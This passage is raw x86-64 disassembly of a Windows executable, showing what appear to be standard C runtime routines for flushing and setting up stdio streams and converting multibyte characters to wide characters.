   140009000:	74 1d                	je     0x14000901f
   140009002:	48 83 60 08 00       	andq   $0x0,0x8(%rax)
   140009007:	48 83 c0 10          	add    $0x10,%rax
   14000900b:	eb eb                	jmp    0x140008ff8
   14000900d:	48 8b 05 14 e0 00 00 	mov    0xe014(%rip),%rax        # 0x140017028
   140009014:	48 89 07             	mov    %rax,(%rdi)
   140009017:	eb 06                	jmp    0x14000901f
   140009019:	41 bc 10 09 00 00    	mov    $0x910,%r12d
   14000901f:	45 84 f6             	test   %r14b,%r14b
   140009022:	74 0a                	je     0x14000902e
   140009024:	b9 03 00 00 00       	mov    $0x3,%ecx
   140009029:	e8 0a e6 ff ff       	call   0x140007638
   14000902e:	48 83 fe 01          	cmp    $0x1,%rsi
   140009032:	75 07                	jne    0x14000903b
   140009034:	33 c0                	xor    %eax,%eax
   140009036:	e9 8e fe ff ff       	jmp    0x140008ec9
   14000903b:	83 fb 08             	cmp    $0x8,%ebx
   14000903e:	75 19                	jne    0x140009059
   140009040:	e8 9f c1 ff ff       	call   0x1400051e4
   140009045:	8b 50 10             	mov    0x10(%rax),%edx
   140009048:	8b cb                	mov    %ebx,%ecx
   14000904a:	48 8b c6             	mov    %rsi,%rax
   14000904d:	4c 8b 05 e4 51 00 00 	mov    0x51e4(%rip),%r8        # 0x14000e238
   140009054:	41 ff d0             	call   *%r8
   140009057:	eb 0e                	jmp    0x140009067
   140009059:	8b cb                	mov    %ebx,%ecx
   14000905b:	48 8b c6             	mov    %rsi,%rax
   14000905e:	48 8b 15 d3 51 00 00 	mov    0x51d3(%rip),%rdx        # 0x14000e238
   140009065:	ff d2                	call   *%rdx
   140009067:	83 fb 0b             	cmp    $0xb,%ebx
   14000906a:	77 c8                	ja     0x140009034
   14000906c:	41 0f a3 dc          	bt     %ebx,%r12d
   140009070:	73 c2                	jae    0x140009034
   140009072:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   140009079:	00 
   14000907a:	49 89 45 08          	mov    %rax,0x8(%r13)
   14000907e:	83 fb 08             	cmp    $0x8,%ebx
   140009081:	75 b1                	jne    0x140009034
   140009083:	e8 5c c1 ff ff       	call   0x1400051e4
   140009088:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   14000908c:	89 48 10             	mov    %ecx,0x10(%rax)
   14000908f:	eb a3                	jmp    0x140009034
   140009091:	45 84 f6             	test   %r14b,%r14b
   140009094:	74 08                	je     0x14000909e
   140009096:	8d 4e 03             	lea    0x3(%rsi),%ecx
   140009099:	e8 9a e5 ff ff       	call   0x140007638
   14000909e:	b9 03 00 00 00       	mov    $0x3,%ecx
   1400090a3:	e8 e4 b3 ff ff       	call   0x14000448c
   1400090a8:	90                   	nop
   1400090a9:	cc                   	int3
   1400090aa:	cc                   	int3
   1400090ab:	cc                   	int3
   1400090ac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400090b1:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400090b6:	57                   	push   %rdi
   1400090b7:	48 83 ec 20          	sub    $0x20,%rsp
   1400090bb:	49 8b f9             	mov    %r9,%rdi
   1400090be:	49 8b d8             	mov    %r8,%rbx
   1400090c1:	48 8b 0a             	mov    (%rdx),%rcx
   1400090c4:	e8 0b 04 00 00       	call   0x1400094d4
   1400090c9:	90                   	nop
   1400090ca:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   1400090ce:	48 8b 03             	mov    (%rbx),%rax
   1400090d1:	48 8b 00             	mov    (%rax),%rax
   1400090d4:	48 85 c0             	test   %rax,%rax
   1400090d7:	74 5a                	je     0x140009133
   1400090d9:	8b 48 14             	mov    0x14(%rax),%ecx
   1400090dc:	8b c1                	mov    %ecx,%eax
   1400090de:	c1 e8 0d             	shr    $0xd,%eax
   1400090e1:	a8 01                	test   $0x1,%al
   1400090e3:	74 4e                	je     0x140009133
   1400090e5:	8b c1                	mov    %ecx,%eax
   1400090e7:	24 03                	and    $0x3,%al
   1400090e9:	3c 02                	cmp    $0x2,%al
   1400090eb:	75 05                	jne    0x1400090f2
   1400090ed:	f6 c1 c0             	test   $0xc0,%cl
   1400090f0:	75 0a                	jne    0x1400090fc
   1400090f2:	0f ba e1 0b          	bt     $0xb,%ecx
   1400090f6:	72 04                	jb     0x1400090fc
   1400090f8:	ff 02                	incl   (%rdx)
   1400090fa:	eb 37                	jmp    0x140009133
   1400090fc:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140009100:	80 38 00             	cmpb   $0x0,(%rax)
   140009103:	75 0f                	jne    0x140009114
   140009105:	48 8b 03             	mov    (%rbx),%rax
   140009108:	48 8b 08             	mov    (%rax),%rcx
   14000910b:	8b 41 14             	mov    0x14(%rcx),%eax
   14000910e:	d1 e8                	shr    $1,%eax
   140009110:	a8 01                	test   $0x1,%al
   140009112:	74 1f                	je     0x140009133
   140009114:	48 8b 03             	mov    (%rbx),%rax
   140009117:	48 8b 08             	mov    (%rax),%rcx
   14000911a:	e8 e5 01 00 00       	call   0x140009304
   14000911f:	83 f8 ff             	cmp    $0xffffffff,%eax
   140009122:	74 08                	je     0x14000912c
   140009124:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140009128:	ff 00                	incl   (%rax)
   14000912a:	eb 07                	jmp    0x140009133
   14000912c:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140009130:	83 08 ff             	orl    $0xffffffff,(%rax)
   140009133:	48 8b 0f             	mov    (%rdi),%rcx
   140009136:	e8 a5 03 00 00       	call   0x1400094e0
   14000913b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009140:	48 83 c4 20          	add    $0x20,%rsp
   140009144:	5f                   	pop    %rdi
   140009145:	c3                   	ret
   140009146:	cc                   	int3
   140009147:	cc                   	int3
   140009148:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000914d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140009152:	56                   	push   %rsi
   140009153:	57                   	push   %rdi
   140009154:	41 56                	push   %r14
   140009156:	48 83 ec 60          	sub    $0x60,%rsp
   14000915a:	49 8b f1             	mov    %r9,%rsi
   14000915d:	49 8b f8             	mov    %r8,%rdi
   140009160:	8b 0a                	mov    (%rdx),%ecx
   140009162:	e8 7d e4 ff ff       	call   0x1400075e4
   140009167:	90                   	nop
   140009168:	48 8b 1d e1 f4 00 00 	mov    0xf4e1(%rip),%rbx        # 0x140018650
   14000916f:	48 63 05 d2 f4 00 00 	movslq 0xf4d2(%rip),%rax        # 0x140018648
   140009176:	4c 8d 34 c3          	lea    (%rbx,%rax,8),%r14
   14000917a:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   14000917f:	49 3b de             	cmp    %r14,%rbx
   140009182:	0f 84 88 00 00 00    	je     0x140009210
   140009188:	48 8b 03             	mov    (%rbx),%rax
   14000918b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140009190:	48 8b 17             	mov    (%rdi),%rdx
   140009193:	48 85 c0             	test   %rax,%rax
   140009196:	74 21                	je     0x1400091b9
   140009198:	8b 48 14             	mov    0x14(%rax),%ecx
   14000919b:	8b c1                	mov    %ecx,%eax
   14000919d:	c1 e8 0d             	shr    $0xd,%eax
   1400091a0:	a8 01                	test   $0x1,%al
   1400091a2:	74 15                	je     0x1400091b9
   1400091a4:	8b c1                	mov    %ecx,%eax
   1400091a6:	24 03                	and    $0x3,%al
   1400091a8:	3c 02                	cmp    $0x2,%al
   1400091aa:	75 05                	jne    0x1400091b1
   1400091ac:	f6 c1 c0             	test   $0xc0,%cl
   1400091af:	75 0e                	jne    0x1400091bf
   1400091b1:	0f ba e1 0b          	bt     $0xb,%ecx
   1400091b5:	72 08                	jb     0x1400091bf
   1400091b7:	ff 02                	incl   (%rdx)
   1400091b9:	48 83 c3 08          	add    $0x8,%rbx
   1400091bd:	eb bb                	jmp    0x14000917a
   1400091bf:	48 8b 57 10          	mov    0x10(%rdi),%rdx
   1400091c3:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   1400091c7:	48 8b 07             	mov    (%rdi),%rax
   1400091ca:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   1400091cf:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   1400091d4:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400091d9:	48 89 4c 24 50       	mov    %rcx,0x50(%rsp)
   1400091de:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
   1400091e3:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1400091e8:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400091ed:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400091f2:	4c 8d 4c 24 28       	lea    0x28(%rsp),%r9
   1400091f7:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   1400091fc:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140009201:	48 8d 8c 24 88 00 00 	lea    0x88(%rsp),%rcx
   140009208:	00 
   140009209:	e8 9e fe ff ff       	call   0x1400090ac
   14000920e:	eb a9                	jmp    0x1400091b9
   140009210:	8b 0e                	mov    (%rsi),%ecx
   140009212:	e8 21 e4 ff ff       	call   0x140007638
   140009217:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   14000921e:	00 
   14000921f:	48 83 c4 60          	add    $0x60,%rsp
   140009223:	41 5e                	pop    %r14
   140009225:	5f                   	pop    %rdi
   140009226:	5e                   	pop    %rsi
   140009227:	c3                   	ret
   140009228:	88 4c 24 08          	mov    %cl,0x8(%rsp)
   14000922c:	55                   	push   %rbp
   14000922d:	48 8b ec             	mov    %rsp,%rbp
   140009230:	48 83 ec 40          	sub    $0x40,%rsp
   140009234:	83 65 28 00          	andl   $0x0,0x28(%rbp)
   140009238:	48 8d 45 28          	lea    0x28(%rbp),%rax
   14000923c:	83 65 20 00          	andl   $0x0,0x20(%rbp)
   140009240:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   140009244:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140009248:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   14000924c:	48 8d 45 10          	lea    0x10(%rbp),%rax
   140009250:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140009254:	48 8d 55 e4          	lea    -0x1c(%rbp),%rdx
   140009258:	48 8d 45 20          	lea    0x20(%rbp),%rax
   14000925c:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140009260:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140009264:	b8 08 00 00 00       	mov    $0x8,%eax
   140009269:	89 45 e0             	mov    %eax,-0x20(%rbp)
   14000926c:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   14000926f:	e8 d4 fe ff ff       	call   0x140009148
   140009274:	80 7d 10 00          	cmpb   $0x0,0x10(%rbp)
   140009278:	8b 45 20             	mov    0x20(%rbp),%eax
   14000927b:	0f 45 45 28          	cmovne 0x28(%rbp),%eax
   14000927f:	48 83 c4 40          	add    $0x40,%rsp
   140009283:	5d                   	pop    %rbp
   140009284:	c3                   	ret
   140009285:	cc                   	int3
   140009286:	cc                   	int3
   140009287:	cc                   	int3
   140009288:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000928d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140009292:	57                   	push   %rdi
   140009293:	48 83 ec 20          	sub    $0x20,%rsp
   140009297:	48 8b d9             	mov    %rcx,%rbx
   14000929a:	8b 49 14             	mov    0x14(%rcx),%ecx
   14000929d:	8b c1                	mov    %ecx,%eax
   14000929f:	24 03                	and    $0x3,%al
   1400092a1:	3c 02                	cmp    $0x2,%al
   1400092a3:	75 4b                	jne    0x1400092f0
   1400092a5:	f6 c1 c0             	test   $0xc0,%cl
   1400092a8:	74 46                	je     0x1400092f0
   1400092aa:	8b 3b                	mov    (%rbx),%edi
   1400092ac:	2b 7b 08             	sub    0x8(%rbx),%edi
   1400092af:	83 63 10 00          	andl   $0x0,0x10(%rbx)
   1400092b3:	48 8b 73 08          	mov    0x8(%rbx),%rsi
   1400092b7:	48 89 33             	mov    %rsi,(%rbx)
   1400092ba:	85 ff                	test   %edi,%edi
   1400092bc:	7e 32                	jle    0x1400092f0
   1400092be:	48 8b cb             	mov    %rbx,%rcx
   1400092c1:	e8 16 04 00 00       	call   0x1400096dc
   1400092c6:	8b c8                	mov    %eax,%ecx
   1400092c8:	44 8b c7             	mov    %edi,%r8d
   1400092cb:	48 8b d6             	mov    %rsi,%rdx
   1400092ce:	e8 89 1f 00 00       	call   0x14000b25c
   1400092d3:	3b f8                	cmp    %eax,%edi
   1400092d5:	74 0a                	je     0x1400092e1
   1400092d7:	f0 83 4b 14 10       	lock orl $0x10,0x14(%rbx)
   1400092dc:	83 c8 ff             	or     $0xffffffff,%eax
   1400092df:	eb 11                	jmp    0x1400092f2
   1400092e1:	8b 43 14             	mov    0x14(%rbx),%eax
   1400092e4:	c1 e8 02             	shr    $0x2,%eax
   1400092e7:	a8 01                	test   $0x1,%al
   1400092e9:	74 05                	je     0x1400092f0
   1400092eb:	f0 83 63 14 fd       	lock andl $0xfffffffd,0x14(%rbx)
   1400092f0:	33 c0                	xor    %eax,%eax
   1400092f2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400092f7:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400092fc:	48 83 c4 20          	add    $0x20,%rsp
   140009300:	5f                   	pop    %rdi
   140009301:	c3                   	ret
   140009302:	cc                   	int3
   140009303:	cc                   	int3
   140009304:	40 53                	rex push %rbx
   140009306:	48 83 ec 20          	sub    $0x20,%rsp
   14000930a:	48 8b d9             	mov    %rcx,%rbx
   14000930d:	48 85 c9             	test   %rcx,%rcx
   140009310:	75 0a                	jne    0x14000931c
   140009312:	48 83 c4 20          	add    $0x20,%rsp
   140009316:	5b                   	pop    %rbx
   140009317:	e9 0c ff ff ff       	jmp    0x140009228
   14000931c:	e8 67 ff ff ff       	call   0x140009288
   140009321:	85 c0                	test   %eax,%eax
   140009323:	75 21                	jne    0x140009346
   140009325:	8b 43 14             	mov    0x14(%rbx),%eax
   140009328:	c1 e8 0b             	shr    $0xb,%eax
   14000932b:	a8 01                	test   $0x1,%al
   14000932d:	74 13                	je     0x140009342
   14000932f:	48 8b cb             	mov    %rbx,%rcx
   140009332:	e8 a5 03 00 00       	call   0x1400096dc
   140009337:	8b c8                	mov    %eax,%ecx
   140009339:	e8 0e 16 00 00       	call   0x14000a94c
   14000933e:	85 c0                	test   %eax,%eax
   140009340:	75 04                	jne    0x140009346
   140009342:	33 c0                	xor    %eax,%eax
   140009344:	eb 03                	jmp    0x140009349
   140009346:	83 c8 ff             	or     $0xffffffff,%eax
   140009349:	48 83 c4 20          	add    $0x20,%rsp
   14000934d:	5b                   	pop    %rbx
   14000934e:	c3                   	ret
   14000934f:	cc                   	int3
   140009350:	b1 01                	mov    $0x1,%cl
   140009352:	e9 d1 fe ff ff       	jmp    0x140009228
   140009357:	cc                   	int3
   140009358:	48 8b c4             	mov    %rsp,%rax
   14000935b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000935f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140009363:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140009367:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000936b:	41 56                	push   %r14
   14000936d:	48 83 ec 20          	sub    $0x20,%rsp
   140009371:	8b 05 d1 f2 00 00    	mov    0xf2d1(%rip),%eax        # 0x140018648
   140009377:	33 db                	xor    %ebx,%ebx
   140009379:	bf 03 00 00 00       	mov    $0x3,%edi
   14000937e:	85 c0                	test   %eax,%eax
   140009380:	75 07                	jne    0x140009389
   140009382:	b8 00 02 00 00       	mov    $0x200,%eax
   140009387:	eb 05                	jmp    0x14000938e
   140009389:	3b c7                	cmp    %edi,%eax
   14000938b:	0f 4c c7             	cmovl  %edi,%eax
   14000938e:	48 63 c8             	movslq %eax,%rcx
   140009391:	ba 08 00 00 00       	mov    $0x8,%edx
   140009396:	89 05 ac f2 00 00    	mov    %eax,0xf2ac(%rip)        # 0x140018648
   14000939c:	e8 3f c4 ff ff       	call   0x1400057e0
   1400093a1:	33 c9                	xor    %ecx,%ecx
   1400093a3:	48 89 05 a6 f2 00 00 	mov    %rax,0xf2a6(%rip)        # 0x140018650
   1400093aa:	e8 a9 c4 ff ff       	call   0x140005858
   1400093af:	48 39 1d 9a f2 00 00 	cmp    %rbx,0xf29a(%rip)        # 0x140018650
   1400093b6:	75 2f                	jne    0x1400093e7
   1400093b8:	ba 08 00 00 00       	mov    $0x8,%edx
   1400093bd:	89 3d 85 f2 00 00    	mov    %edi,0xf285(%rip)        # 0x140018648
   1400093c3:	48 8b cf             	mov    %rdi,%rcx
   1400093c6:	e8 15 c4 ff ff       	call   0x1400057e0
   1400093cb:	33 c9                	xor    %ecx,%ecx
   1400093cd:	48 89 05 7c f2 00 00 	mov    %rax,0xf27c(%rip)        # 0x140018650
   1400093d4:	e8 7f c4 ff ff       	call   0x140005858
   1400093d9:	48 39 1d 70 f2 00 00 	cmp    %rbx,0xf270(%rip)        # 0x140018650
   1400093e0:	75 05                	jne    0x1400093e7
   1400093e2:	83 c8 ff             	or     $0xffffffff,%eax
   1400093e5:	eb 75                	jmp    0x14000945c
   1400093e7:	48 8b eb             	mov    %rbx,%rbp
   1400093ea:	48 8d 35 e7 e3 00 00 	lea    0xe3e7(%rip),%rsi        # 0x1400177d8
   1400093f1:	4c 8d 35 c8 e3 00 00 	lea    0xe3c8(%rip),%r14        # 0x1400177c0
   1400093f8:	49 8d 4e 30          	lea    0x30(%r14),%rcx
   1400093fc:	45 33 c0             	xor    %r8d,%r8d
   1400093ff:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140009404:	e8 af f5 ff ff       	call   0x1400089b8
   140009409:	48 8b 05 40 f2 00 00 	mov    0xf240(%rip),%rax        # 0x140018650
   140009410:	4c 8d 05 39 ec 00 00 	lea    0xec39(%rip),%r8        # 0x140018050
   140009417:	48 8b d5             	mov    %rbp,%rdx
   14000941a:	48 c1 fa 06          	sar    $0x6,%rdx
   14000941e:	4c 89 34 03          	mov    %r14,(%rbx,%rax,1)
   140009422:	48 8b c5             	mov    %rbp,%rax
   140009425:	83 e0 3f             	and    $0x3f,%eax
   140009428:	48 8d 0c c0          	lea    (%rax,%rax,8),%rcx
   14000942c:	49 8b 04 d0          	mov    (%r8,%rdx,8),%rax
   140009430:	48 8b 4c c8 28       	mov    0x28(%rax,%rcx,8),%rcx
   140009435:	48 83 c1 02          	add    $0x2,%rcx
   140009439:	48 83 f9 02          	cmp    $0x2,%rcx
   14000943d:	77 06                	ja     0x140009445
   14000943f:	c7 06 fe ff ff ff    	movl   $0xfffffffe,(%rsi)
   140009445:	48 ff c5             	inc    %rbp
   140009448:	49 83 c6 58          	add    $0x58,%r14
   14000944c:	48 83 c3 08          	add    $0x8,%rbx
   140009450:	48 83 c6 58          	add    $0x58,%rsi
   140009454:	48 83 ef 01          	sub    $0x1,%rdi
   140009458:	75 9e                	jne    0x1400093f8
   14000945a:	33 c0                	xor    %eax,%eax
   14000945c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009461:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140009466:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000946b:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140009470:	48 83 c4 20          	add    $0x20,%rsp
   140009474:	41 5e                	pop    %r14
   140009476:	c3                   	ret
   140009477:	cc                   	int3
   140009478:	40 53                	rex push %rbx
   14000947a:	48 83 ec 20          	sub    $0x20,%rsp
   14000947e:	e8 cd fe ff ff       	call   0x140009350
   140009483:	e8 a4 21 00 00       	call   0x14000b62c
   140009488:	33 db                	xor    %ebx,%ebx
   14000948a:	48 8b 0d bf f1 00 00 	mov    0xf1bf(%rip),%rcx        # 0x140018650
   140009491:	48 8b 0c 0b          	mov    (%rbx,%rcx,1),%rcx
   140009495:	e8 46 22 00 00       	call   0x14000b6e0
   14000949a:	48 8b 05 af f1 00 00 	mov    0xf1af(%rip),%rax        # 0x140018650
   1400094a1:	48 8b 0c 03          	mov    (%rbx,%rax,1),%rcx
   1400094a5:	48 83 c1 30          	add    $0x30,%rcx
   1400094a9:	ff 15 09 4c 00 00    	call   *0x4c09(%rip)        # 0x14000e0b8
   1400094af:	48 83 c3 08          	add    $0x8,%rbx
   1400094b3:	48 83 fb 18          	cmp    $0x18,%rbx
   1400094b7:	75 d1                	jne    0x14000948a
   1400094b9:	48 8b 0d 90 f1 00 00 	mov    0xf190(%rip),%rcx        # 0x140018650
   1400094c0:	e8 93 c3 ff ff       	call   0x140005858
   1400094c5:	48 83 25 83 f1 00 00 	andq   $0x0,0xf183(%rip)        # 0x140018650
   1400094cc:	00 
   1400094cd:	48 83 c4 20          	add    $0x20,%rsp
   1400094d1:	5b                   	pop    %rbx
   1400094d2:	c3                   	ret
   1400094d3:	cc                   	int3
   1400094d4:	48 83 c1 30          	add    $0x30,%rcx
   1400094d8:	48 ff 25 c9 4b 00 00 	rex.W jmp *0x4bc9(%rip)        # 0x14000e0a8
   1400094df:	cc                   	int3
   1400094e0:	48 83 c1 30          	add    $0x30,%rcx
   1400094e4:	48 ff 25 c5 4b 00 00 	rex.W jmp *0x4bc5(%rip)        # 0x14000e0b0
   1400094eb:	cc                   	int3
   1400094ec:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400094f1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400094f6:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400094fb:	57                   	push   %rdi
   1400094fc:	48 83 ec 50          	sub    $0x50,%rsp
   140009500:	33 ed                	xor    %ebp,%ebp
   140009502:	49 8b f0             	mov    %r8,%rsi
   140009505:	48 8b fa             	mov    %rdx,%rdi
   140009508:	48 8b d9             	mov    %rcx,%rbx
   14000950b:	48 85 d2             	test   %rdx,%rdx
   14000950e:	0f 84 38 01 00 00    	je     0x14000964c
   140009514:	4d 85 c0             	test   %r8,%r8
   140009517:	0f 84 2f 01 00 00    	je     0x14000964c
   14000951d:	40 38 2a             	cmp    %bpl,(%rdx)
   140009520:	75 11                	jne    0x140009533
   140009522:	48 85 c9             	test   %rcx,%rcx
   140009525:	0f 84 28 01 00 00    	je     0x140009653
   14000952b:	66 89 29             	mov    %bp,(%rcx)
   14000952e:	e9 20 01 00 00       	jmp    0x140009653
   140009533:	49 8b d1             	mov    %r9,%rdx
   140009536:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000953b:	e8 d4 b7 ff ff       	call   0x140004d14
   140009540:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140009545:	81 78 0c e9 fd 00 00 	cmpl   $0xfde9,0xc(%rax)
   14000954c:	75 22                	jne    0x140009570
   14000954e:	4c 8d 0d 13 f1 00 00 	lea    0xf113(%rip),%r9        # 0x140018668
   140009555:	4c 8b c6             	mov    %rsi,%r8
   140009558:	48 8b d7             	mov    %rdi,%rdx
   14000955b:	48 8b cb             	mov    %rbx,%rcx
   14000955e:	e8 69 22 00 00       	call   0x14000b7cc
   140009563:	48 8b c8             	mov    %rax,%rcx
   140009566:	83 c8 ff             	or     $0xffffffff,%eax
   140009569:	85 c9                	test   %ecx,%ecx
   14000956b:	0f 48 c8             	cmovs  %eax,%ecx
   14000956e:	eb 19                	jmp    0x140009589
   140009570:	48 39 a8 38 01 00 00 	cmp    %rbp,0x138(%rax)
   140009577:	75 2a                	jne    0x1400095a3
   140009579:	48 85 db             	test   %rbx,%rbx
   14000957c:	74 06                	je     0x140009584
   14000957e:	0f b6 07             	movzbl (%rdi),%eax
   140009581:	66 89 03             	mov    %ax,(%rbx)
   140009584:	b9 01 00 00 00       	mov    $0x1,%ecx
   140009589:	40 38 6c 24 48       	cmp    %bpl,0x48(%rsp)
   14000958e:	74 0c                	je     0x14000959c
   140009590:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140009595:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000959c:	8b c1                	mov    %ecx,%eax
   14000959e:	e9 b2 00 00 00       	jmp    0x140009655
   1400095a3:	0f b6 0f             	movzbl (%rdi),%ecx
   1400095a6:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   1400095ab:	e8 d0 21 00 00       	call   0x14000b780
   1400095b0:	85 c0                	test   %eax,%eax
   1400095b2:	74 52                	je     0x140009606
   1400095b4:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400095b9:	44 8b 49 08          	mov    0x8(%rcx),%r9d
   1400095bd:	41 83 f9 01          	cmp    $0x1,%r9d
   1400095c1:	7e 2f                	jle    0x1400095f2
   1400095c3:	41 3b f1             	cmp    %r9d,%esi
   1400095c6:	7c 2a                	jl     0x1400095f2
   1400095c8:	8b 49 0c             	mov    0xc(%rcx),%ecx
   1400095cb:	8b c5                	mov    %ebp,%eax
   1400095cd:	48 85 db             	test   %rbx,%rbx
   1400095d0:	4c 8b c7             	mov    %rdi,%r8
   1400095d3:	ba 09 00 00 00       	mov    $0x9,%edx
   1400095d8:	0f 95 c0             	setne  %al
   1400095db:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400095df:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400095e4:	e8 93 d9 ff ff       	call   0x140006f7c
   1400095e9:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400095ee:	85 c0                	test   %eax,%eax
   1400095f0:	75 0f                	jne    0x140009601
   1400095f2:	48 63 41 08          	movslq 0x8(%rcx),%rax
   1400095f6:	48 3b f0             	cmp    %rax,%rsi
   1400095f9:	72 3e                	jb     0x140009639
   1400095fb:	40 38 6f 01          	cmp    %bpl,0x1(%rdi)
   1400095ff:	74 38                	je     0x140009639
   140009601:	8b 49 08             	mov    0x8(%rcx),%ecx
   140009604:	eb 83                	jmp    0x140009589
   140009606:	8b c5                	mov    %ebp,%eax
   140009608:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   14000960e:	48 85 db             	test   %rbx,%rbx
   140009611:	4c 8b c7             	mov    %rdi,%r8
   140009614:	0f 95 c0             	setne  %al
   140009617:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000961b:	41 8d 51 08          	lea    0x8(%r9),%edx
   14000961f:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140009624:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140009629:	8b 48 0c             	mov    0xc(%rax),%ecx
   14000962c:	e8 4b d9 ff ff       	call   0x140006f7c
   140009631:	85 c0                	test   %eax,%eax
   140009633:	0f 85 4b ff ff ff    	jne    0x140009584
   140009639:	e8 82 c1 ff ff       	call   0x1400057c0
   14000963e:	83 c9 ff             	or     $0xffffffff,%ecx
   140009641:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   140009647:	e9 3d ff ff ff       	jmp    0x140009589
   14000964c:	48 89 2d 15 f0 00 00 	mov    %rbp,0xf015(%rip)        # 0x140018668
   140009653:	33 c0                	xor    %eax,%eax
   140009655:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   14000965a:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   14000965f:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140009664:	48 83 c4 50          	add    $0x50,%rsp
   140009668:	5f                   	pop    %rdi
   140009669:	c3                   	ret
   14000966a:	cc                   	int3
   14000966b:	cc                   	int3
   14000966c:	45 33 c9             	xor    %r9d,%r9d
   14000966f:	e9 78 fe ff ff       	jmp    0x1400094ec
   140009674:	40 53                	rex push %rbx
   140009676:	48 83 ec 20          	sub    $0x20,%rsp
   14000967a:	48 8b 05 d7 ed 00 00 	mov    0xedd7(%rip),%rax        # 0x140018458
   140009681:	48 8b da             	mov    %rdx,%rbx
   140009684:	48 39 02             	cmp    %rax,(%rdx)
   140009687:	74 16                	je     0x14000969f
   140009689:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   14000968f:	85 05 1b e1 00 00    	test   %eax,0xe11b(%rip)        # 0x1400177b0
   140009695:	75 08                	jne    0x14000969f
   140009697:	e8 d8 ed ff ff       	call   0x140008474
   14000969c:	48 89 03             	mov    %rax,(%rbx)
   14000969f:	48 83 c4 20          	add    $0x20,%rsp
   1400096a3:	5b                   	pop    %rbx
   1400096a4:	c3                   	ret
   1400096a5:	cc                   	int3
   1400096a6:	cc                   	int3
   1400096a7:	cc                   	int3
   1400096a8:	40 53                	rex push %rbx
   1400096aa:	48 83 ec 20          	sub    $0x20,%rsp
   1400096ae:	48 8b 05 43 e7 00 00 	mov    0xe743(%rip),%rax        # 0x140017df8
   1400096b5:	48 8b da             	mov    %rdx,%rbx
   1400096b8:	48 39 02             	cmp    %rax,(%rdx)
   1400096bb:	74 16                	je     0x1400096d3
   1400096bd:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   1400096c3:	85 05 e7 e0 00 00    	test   %eax,0xe0e7(%rip)        # 0x1400177b0
   1400096c9:	75 08                	jne    0x1400096d3
   1400096cb:	e8 48 d5 ff ff       	call   0x140006c18
   1400096d0:	48 89 03             	mov    %rax,(%rbx)
   1400096d3:	48 83 c4 20          	add    $0x20,%rsp
   1400096d7:	5b                   	pop    %rbx
   1400096d8:	c3                   	ret
   1400096d9:	cc                   	int3
   1400096da:	cc                   	int3
   1400096db:	cc                   	int3
   1400096dc:	48 83 ec 28          	sub    $0x28,%rsp
   1400096e0:	48 85 c9             	test   %rcx,%rcx
   1400096e3:	75 15                	jne    0x1400096fa
   1400096e5:	e8 d6 c0 ff ff       	call   0x1400057c0
